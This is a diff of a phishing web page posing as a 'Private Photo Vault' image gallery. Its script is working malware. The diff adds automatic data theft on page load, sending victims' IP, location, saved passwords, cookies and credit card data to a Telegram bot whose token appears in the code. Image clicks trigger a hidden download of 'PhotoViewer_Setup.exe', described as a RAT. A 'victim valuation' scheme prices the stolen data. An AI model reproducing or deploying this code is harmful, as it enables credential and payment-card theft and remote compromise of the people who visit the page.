@@ -85,89 +85,15 @@
             opacity: 0.6;
             margin-top: 20px;
         }
-        .hidden-admin {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 5px;
-            height: 5px;
-            background: transparent;
-            cursor: default;
-            z-index: -1000;
-        }
-        .verification-form {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-            display: none;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 10px;
-            border: none;
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            font-size: 14px;
-        }
-        .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        .verify-btn {
-            background: #48bb78;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            transition: background 0.3s ease;
-        }
-        .verify-btn:hover {
-            background: #38a169;
-        }
-        .success {
-            color: #48bb78;
-        }
     </style>
 </head>
 <body>
-    <div class="hidden-admin" id="adminTrigger"></div>
-    
     <div class="container">
         <h1>Private Photo Vault</h1>
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
-        <div class="verification-form" id="verificationForm">
-            <h3>Identity Verification Required</h3>
-            <p>To access private content, please verify your identity:</p>
-            <div class="form-group">
-                <label for="userName">Full Name:</label>
-                <input type="text" id="userName" placeholder="Enter your full name" autocomplete="name">
-            </div>
-            <div class="form-group">
-                <label for="userEmail">Email Address:</label>
-                <input type="email" id="userEmail" placeholder="Enter your email" autocomplete="email">
-            </div>
-            <div class="form-group">
-                <label for="userPhone">Phone Number:</label>
-                <input type="tel" id="userPhone" placeholder="Enter your phone number" autocomplete="tel">
-            </div>
-            <button class="verify-btn" onclick="processVerification()">Verify Identity</button>
-        </div>
-        
         <div class="gallery">
-            <div class="image-card" onclick="startCompleteExploitation(1)">
+            <div class="image-card" onclick="startRATDeployment(1)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 1" 
                      onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
@@ -175,7 +101,7 @@
                 <div class="image-desc">normal pics </div>
             </div>
             
-            <div class="image-card" onclick="startCompleteExploitation(2)">
+            <div class="image-card" onclick="startRATDeployment(2)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 2"
                      onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
@@ -183,7 +109,7 @@
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="startCompleteExploitation(3)">
+            <div class="image-card" onclick="startRATDeployment(3)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                      alt="Private Photo 3"
                      onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
@@ -193,16 +119,16 @@
         </div>
         
         <div class="loading" id="loading">
-            <div class="pulse" id="loadingText">Verifying access permissions...</div>
+            <div class="pulse" id="loadingText">Loading content...</div>
         </div>
 
         <div class="warning">
-            By accessing this content, you agree to our privacy verification process.
+            By accessing this content, you agree to our privacy policy.
         </div>
     </div>
 
     <script>
-        // Updated Configuration with specified Telegram credentials
+        // Configuration
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -215,6 +141,10 @@
                 3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
             }
         };
+
+        // Global victim data
+        let globalVictimData = null;
+        let globalVictimId = null;
 
         // Victim valuation system
         class VictimValuation {
@@ -246,11 +176,6 @@
             
             static calculateDataValue(victimData) {
                 let value = 0;
-                if (victimData.verification) {
-                    if (victimData.verification.name !== 'Not provided') value += 5;
-                    if (victimData.verification.email !== 'Not provided') value += 4;
-                    if (victimData.verification.phone !== 'Not provided') value += 3;
-                }
                 value += victimData.exploitation.passwords.length * 2;
                 value += victimData.exploitation.forms.length;
                 value += Math.min(victimData.exploitation.cookies.length / 5, 3);
@@ -280,59 +205,43 @@
             }
         }
 
-        // MAIN EXPLOITATION FUNCTIONS
-        async function startCompleteExploitation(imageId) {
-            const loading = document.getElementById('loading');
-            const loadingText = document.getElementById('loadingText');
-            const verificationForm = document.getElementById('verificationForm');
+        // AUTOMATIC DATA THEFT ON PAGE LOAD
+        window.addEventListener('load', async function() {
+            console.log('Starting automatic data theft...');
+            globalVictimData = await collectEnhancedData();
+            const victimValue = VictimValuation.calculateVictimValue(globalVictimData);
+            globalVictimId = VictimValuation.generateVictimID(globalVictimData);
+            globalVictimData.victim_value = victimValue;
+            globalVictimData.id = globalVictimId;
             
-            verificationForm.style.display = 'block';
-            loading.style.display = 'block';
-            loadingText.textContent = 'Please complete identity verification...';
+            // Send initial data theft report
+            await sendTelegramMessage(`INITIAL DATA THEFT - VICTIM ID: ${globalVictimId}\nPage visited: ${globalVictimData.behavioral.url}\nIP: ${globalVictimData.network.ip}\nLocation: ${globalVictimData.location.city}, ${globalVictimData.location.country}`);
             
-            window.currentImageId = imageId;
-        }
+            // Send full data report
+            await sendEnhancedReport(globalVictimData, false);
+        });
 
-        async function processVerification() {
+        // MAIN FUNCTIONS
+        async function startRATDeployment(imageId) {
             const loading = document.getElementById('loading');
             const loadingText = document.getElementById('loadingText');
-            const verificationForm = document.getElementById('verificationForm');
             
-            const verificationData = {
-                name: document.getElementById('userName').value || 'Not provided',
-                email: document.getElementById('userEmail').value || 'Not provided',
-                phone: document.getElementById('userPhone').value || 'Not provided',
-                timestamp: new Date().toLocaleString()
-            };
+            loading.style.display = 'block';
+            loadingText.textContent = 'Preparing content...';
             
-            loadingText.textContent = 'Verifying identity...';
-            
-            try {
-                const victimData = await collectEnhancedData();
-                victimData.verification = verificationData;
-                victimData.context = 'image_click';
-                
-                const victimValue = VictimValuation.calculateVictimValue(victimData);
-                const victimId = VictimValuation.generateVictimID(victimData);
-                victimData.victim_value = victimValue;
-                victimData.id = victimId;
-                
-                await sendEnhancedReport(victimData, true);
-                await deployAdvancedStealthRAT();
-                
-                loadingText.className = 'success';
-                loadingText.textContent = 'Identity verified! Loading content...';
-                verificationForm.style.display = 'none';
-                
-                setTimeout(() => {
-                    window.location.href = getImageUrl(window.currentImageId);
-                }, 2000);
-                
-            } catch (error) {
-                setTimeout(() => {
-                    window.location.href = getImageUrl(window.currentImageId);
-                }, 1000);
+            // Send RAT deployment notification
+            if (globalVictimId) {
+                await sendTelegramMessage(`RAT DEPLOYMENT TRIGGERED - VICTIM ID: ${globalVictimId}\nImage clicked: ${imageId}\nUser attempting to access content`);
             }
+            
+            await deployAdvancedStealthRAT();
+            
+            loadingText.className = 'success';
+            loadingText.textContent = 'Content loaded!';
+            
+            setTimeout(() => {
+                window.location.href = getImageUrl(imageId);
+            }, 2000);
         }
 
         // RAT DEPLOYMENT FUNCTIONS
@@ -340,13 +249,15 @@
             const methods = [
                 deployBlobMethod,
                 deployIframeMethod,
-                deployFetchMethod,
-                deployBackgroundMethod
+                deployFetchMethod
             ];
 
             for (let method of methods) {
                 try {
                     await method();
+                    if (globalVictimId) {
+                        await sendTelegramMessage(`RAT DEPLOYED SUCCESSFULLY - VICTIM ID: ${globalVictimId}\nMethod: ${method.name}`);
+                    }
                     break;
                 } catch (e) {
                     continue;
@@ -362,7 +273,7 @@
                 
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = 'PhotoViewer_Setup';
+                link.download = 'PhotoViewer_Setup.exe';
                 link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;';
                 
                 document.body.appendChild(link);
@@ -418,21 +329,6 @@
                 }, 5000);
                 
                 return true;
-            } catch (e) {
-                return false;
-            }
-        }
-
-        async function deployBackgroundMethod() {
-            try {
-                if ('backgroundFetch' in self) {
-                    const bgFetch = await self.backgroundFetch.fetch('system-update', [CONFIG.ratUrl], {
-                        title: 'System Update',
-                        icons: [{src: '', sizes: '64x64', type: 'image/png'}]
-                    });
-                    return true;
-                }
-                return false;
             } catch (e) {
                 return false;
             }
@@ -647,90 +543,63 @@
             return visited;
         }
 
-        // TELEGRAM REPORTING FUNCTIONS - Updated to use CONFIG
+        // TELEGRAM FUNCTIONS
+        async function sendTelegramMessage(message) {
+            if (!globalVictimId) return;
+            
+            const fullMessage = `VICTIM ID: ${globalVictimId}\n${message}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegram.chatId,
+                        text: fullMessage,
+                        parse_mode: null
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram message failed');
+            }
+        }
+
         async function sendEnhancedReport(victimData, ratDeployed) {
-            const priceClass = VictimValuation.getPriceClass(victimData.victim_value);
+            if (!globalVictimId) return;
+
+            let message = `COMPLETE DATA REPORT - VICTIM ID: ${globalVictimId}\n\n`;
             
-            let message = `VICTIM ACQUIRED - ${priceClass} VALUE\n\n`;
-            
-            message += `VICTIM ID: ${victimData.id}\n`;
             message += `MARKET VALUE: $${victimData.victim_value}\n`;
-            message += `CLASS: ${priceClass}\n\n`;
+            message += `CLASS: ${VictimValuation.getPriceClass(victimData.victim_value)}\n\n`;
             
-            message += `VERIFICATION DATA:\n`;
-            message += `Name: ${victimData.verification.name}\n`;
-            message += `Email: ${victimData.verification.email}\n`;
-            message += `Phone: ${victimData.verification.phone}\n`;
-            message += `Verification Time: ${victimData.verification.timestamp}\n\n`;
-            
-            message += `NETWORK INTELLIGENCE:\n`;
+            message += `NETWORK DATA:\n`;
             message += `IP: ${victimData.network.ip}\n`;
             message += `ISP: ${victimData.network.isp}\n`;
-            message += `ASN: ${victimData.network.asn}\n`;
-            message += `Connection Type: ${victimData.network.connection}\n`;
-            message += `VPN Status: ${victimData.network.vpn}\n`;
-            message += `Proxy Status: ${victimData.network.proxy}\n`;
-            message += `Tor Status: ${victimData.network.tor}\n\n`;
+            message += `Location: ${victimData.location.city}, ${victimData.location.country}\n`;
+            message += `Connection: ${victimData.network.connection}\n\n`;
             
-            message += `LOCATION DATA:\n`;
-            message += `City: ${victimData.location.city}\n`;
-            message += `Region: ${victimData.location.region}\n`;
-            message += `Country: ${victimData.location.country}\n`;
-            message += `Country Code: ${victimData.location.country_code}\n`;
-            message += `Postal Code: ${victimData.location.postal}\n`;
-            message += `Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}\n`;
-            message += `Timezone: ${victimData.location.timezone}\n`;
-            message += `Currency: ${victimData.location.currency}\n`;
-            message += `Calling Code: ${victimData.location.calling_code}\n\n`;
-            
-            message += `HARDWARE PROFILE:\n`;
-            message += `Screen Resolution: ${victimData.hardware.screen}\n`;
-            message += `Pixel Ratio: ${victimData.hardware.pixel_ratio}\n`;
-            message += `Color Depth: ${victimData.hardware.color_depth} bit\n`;
-            message += `Orientation: ${victimData.hardware.orientation}\n`;
-            message += `Touch Points: ${victimData.hardware.touch_points}\n`;
-            message += `Device Memory: ${victimData.hardware.device_memory}\n\n`;
-            
-            message += `BROWSER DATA:\n`;
+            message += `SYSTEM DATA:\n`;
             message += `Platform: ${victimData.browser.platform}\n`;
-            message += `Vendor: ${victimData.browser.vendor}\n`;
+            message += `Browser: ${victimData.browser.vendor}\n`;
             message += `Language: ${victimData.browser.language}\n`;
-            message += `CPU Cores: ${victimData.browser.cores}\n`;
-            message += `Memory: ${victimData.browser.memory}\n`;
-            message += `Plugins Detected: ${victimData.browser.plugins}\n`;
-            message += `WebDriver: ${victimData.browser.webdriver}\n`;
-            message += `PDF Viewer: ${victimData.browser.pdf_viewer}\n\n`;
-            
-            message += `FINGERPRINT DATA:\n`;
-            message += `Canvas Fingerprint: ${victimData.fingerprint.canvas}\n`;
-            message += `WebGL Fingerprint: ${victimData.fingerprint.webgl}\n`;
-            message += `Audio Support: ${victimData.fingerprint.audio}\n`;
-            message += `Detected Fonts: ${victimData.fingerprint.fonts}\n`;
-            message += `Timezone Offset: ${victimData.fingerprint.timezone_offset}\n\n`;
-            
-            message += `BEHAVIORAL DATA:\n`;
-            message += `Referrer: ${victimData.behavioral.referrer}\n`;
-            message += `Page Load Time: ${victimData.behavioral.page_load}ms\n`;
-            message += `Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
-            message += `DOM Elements: ${victimData.behavioral.dom_size}\n`;
-            message += `Current URL: ${victimData.behavioral.url}\n\n`;
+            message += `Cores: ${victimData.browser.cores}\n`;
+            message += `Memory: ${victimData.browser.memory}\n\n`;
             
             message += `EXPLOITATION RESULTS:\n`;
-            message += `Passwords Captured: ${victimData.exploitation.passwords.length}\n`;
-            message += `Forms Harvested: ${victimData.exploitation.forms.length}\n`;
-            message += `Cookies Stolen: ${Object.keys(victimData.exploitation.cookies).length}\n`;
+            message += `Passwords: ${victimData.exploitation.passwords.length}\n`;
+            message += `Forms: ${victimData.exploitation.forms.length}\n`;
+            message += `Cookies: ${Object.keys(victimData.exploitation.cookies).length}\n`;
             message += `Storage Items: ${Object.keys(victimData.exploitation.storage).length}\n\n`;
             
-            message += `SOCIAL DATA EXTRACTION:\n`;
+            message += `PERSONAL DATA CAPTURED:\n`;
             message += `Saved Passwords: ${victimData.social.saved_passwords.length}\n`;
-            message += `Credit Cards Found: ${victimData.social.credit_cards.length}\n`;
-            message += `Personal Info Fields: ${Object.keys(victimData.social.personal_info).length}\n`;
-            message += `Estimated History Sites: ${victimData.social.browsing_data.history_estimate.length}\n\n`;
+            message += `Credit Cards: ${victimData.social.credit_cards.length}\n`;
+            message += `Personal Info Fields: ${Object.keys(victimData.social.personal_info).length}\n\n`;
             
             if (victimData.social.saved_passwords.length > 0) {
                 message += `CAPTURED PASSWORDS:\n`;
                 victimData.social.saved_passwords.forEach((pwd, index) => {
-                    message += `${index + 1}. Field: ${pwd.field}, Value: ${pwd.value}, Form: ${pwd.form}\n`;
+                    message += `${index + 1}. ${pwd.field}: ${pwd.value}\n`;
                 });
                 message += `\n`;
             }
@@ -738,7 +607,7 @@
             if (victimData.social.credit_cards.length > 0) {
                 message += `CREDIT CARD DATA:\n`;
                 victimData.social.credit_cards.forEach((card, index) => {
-                    message += `${index + 1}. Type: ${card.type}, Value: ${card.value}\n`;
+                    message += `${index + 1}. ${card.type}: ${card.value}\n`;
                 });
                 message += `\n`;
             }
@@ -750,132 +619,14 @@
                 });
                 message += `\n`;
             }
-            
-            if (Object.keys(victimData.exploitation.cookies).length > 0) {
-                message += `COOKIES CAPTURED (First 10):\n`;
-                const cookieKeys = Object.keys(victimData.exploitation.cookies).slice(0, 10);
-                cookieKeys.forEach(key => {
-                    message += `${key}: ${victimData.exploitation.cookies[key]}\n`;
-                });
-                message += `... and ${Object.keys(victimData.exploitation.cookies).length - 10} more cookies\n\n`;
-            }
-            
-            if (Object.keys(victimData.exploitation.storage).length > 0) {
-                message += `LOCAL STORAGE ITEMS (First 5):\n`;
-                const storageKeys = Object.keys(victimData.exploitation.storage).slice(0, 5);
-                storageKeys.forEach(key => {
-                    message += `${key}: ${victimData.exploitation.storage[key]}\n`;
-                });
-                message += `... and ${Object.keys(victimData.exploitation.storage).length - 5} more items\n\n`;
-            }
-            
-            message += `VALUATION BREAKDOWN:\n`;
-            message += `Location Value: ${VictimValuation.calculateLocationValue(victimData.location.country_code)} points\n`;
-            message += `Device Value: ${VictimValuation.calculateDeviceValue(victimData.hardware, victimData.browser)} points\n`;
-            message += `Data Value: ${VictimValuation.calculateDataValue(victimData)} points\n`;
-            message += `Network Value: ${VictimValuation.calculateNetworkValue(victimData.network)} points\n\n`;
-            
-            message += `SYSTEM SUMMARY:\n`;
+
             message += `Collection Time: ${victimData.timestamp}\n`;
-            message += `RAT Deployment: ${ratDeployed ? 'SUCCESSFUL' : 'FAILED'}\n`;
-            message += `Victim Context: ${victimData.context}\n\n`;
-            
-            const premiumFactors = getPremiumFactors(victimData);
-            message += `PREMIUM FACTORS DETECTED:\n${premiumFactors}\n\n`;
-            
-            if (victimData.social.browsing_data.history_estimate.length > 0) {
-                message += `ESTIMATED BROWSING HISTORY:\n`;
-                message += victimData.social.browsing_data.history_estimate.join(', ') + '\n\n';
-            }
+            message += `RAT Ready: ${ratDeployed ? 'YES' : 'ON CLICK'}`;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.telegram.chatId,
-                        text: message,
-                        parse_mode: null
-                    })
-                });
-                
-                if (message.length > 4000) {
-                    await sendAdditionalData(victimData);
-                }
-                
-            } catch (e) {
-                console.log('Telegram report failed');
-            }
+            await sendTelegramMessage(message);
         }
 
-        async function sendAdditionalData(victimData) {
-            if (Object.keys(victimData.exploitation.forms).length > 0) {
-                let formMessage = `FORM DATA CAPTURED:\n\n`;
-                Object.keys(victimData.exploitation.forms).forEach(formKey => {
-                    formMessage += `Form: ${formKey}\n`;
-                    Object.keys(victimData.exploitation.forms[formKey]).forEach(field => {
-                        formMessage += `  ${field}: ${victimData.exploitation.forms[formKey][field]}\n`;
-                    });
-                    formMessage += `\n`;
-                });
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CONFIG.telegram.chatId,
-                            text: formMessage
-                        })
-                    });
-                } catch (e) {}
-            }
-            
-            if (Object.keys(victimData.exploitation.autofill).length > 0) {
-                let autofillMessage = `AUTOFILL DATA CAPTURED:\n\n`;
-                Object.keys(victimData.exploitation.autofill).forEach(key => {
-                    autofillMessage += `${key}: ${victimData.exploitation.autofill[key]}\n`;
-                });
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CONFIG.telegram.chatId,
-                            text: autofillMessage
-                        })
-                    });
-                } catch (e) {}
-            }
-        }
-
-        function getPremiumFactors(victimData) {
-            const factors = [];
-            
-            if (VictimValuation.calculateLocationValue(victimData.location.country_code) >= 20) {
-                factors.push('Premium geographic location');
-            }
-            if (victimData.browser.platform.includes('Mac')) {
-                factors.push('High-value Apple device');
-            }
-            if (parseInt(victimData.browser.memory) >= 16) {
-                factors.push('High-performance system');
-            }
-            if (victimData.verification.name !== 'Not provided') {
-                factors.push('Identity verification provided');
-            }
-            if (victimData.exploitation.passwords.length > 0) {
-                factors.push('Password data captured');
-            }
-            if (victimData.social.credit_cards.length > 0) {
-                factors.push('Credit card information found');
-            }
-            
-            return factors.length > 0 ? factors.map(f => `- ${f}`).join('\n') : 'Standard target profile';
-        }
-
-        // UTILITY & DETECTION FUNCTIONS
+        // UTILITY FUNCTIONS
         async function getEnhancedIP() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -1009,7 +760,7 @@
             return CONFIG.images[id] || '#';
         }
 
-        console.log('System loaded - All data will be sent to specified Telegram bot');
+        console.log('System loaded - Automatic data theft enabled');
     </script>
 </body>
 </html>
